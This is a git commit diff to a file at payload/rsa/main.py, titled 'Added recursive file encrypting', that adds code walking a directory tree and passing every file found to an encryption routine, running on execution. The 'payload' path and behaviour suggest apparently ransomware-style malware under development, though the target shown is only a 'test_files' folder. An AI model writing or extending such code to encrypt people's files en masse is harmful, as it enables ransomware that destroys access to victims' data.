5fc3c4f444ac06af92a06286a0fb4041a348acd5
Matt N <mattnappo@gmail.com>
2018-08-23 22:50:41 -0400

    Added recursive file encrypting

--- payload/rsa/main.py
+++ payload/rsa/main.py
@@ -1,5 +1,6 @@
 from key import Key
 from encrypt import Encrypt
+import os
 
 def new_key():
     key = Key()
@@ -9,10 +10,29 @@ def new_key():
 def encrypt():
     Encrypt(
         [
-            "test/test1",
-            "test/test2"
+            "test_files/test1",
+            "test_files/test2"
         ],
         "3b4e434"
     )
-# new_key()
-encrypt()
+
+
+all_files = []
+def r_loop(dir_name): # recursively loop through a folder, adding each file and its complete path to an array
+    files = os.listdir(dir_name)
+    for f in files:
+        if os.path.isdir(dir_name + "/" + f) == 1:
+            new_dir = dir_name + "/" + f 
+            r_loop(new_dir)
+        else:
+            all_files.append(dir_name + "/" + f)
+
+def r_encrypt():
+    r_loop("test_files")
+    print(all_files)
+    Encrypt(
+        all_files,
+        "3b4e434"
+    )
+
+r_encrypt()
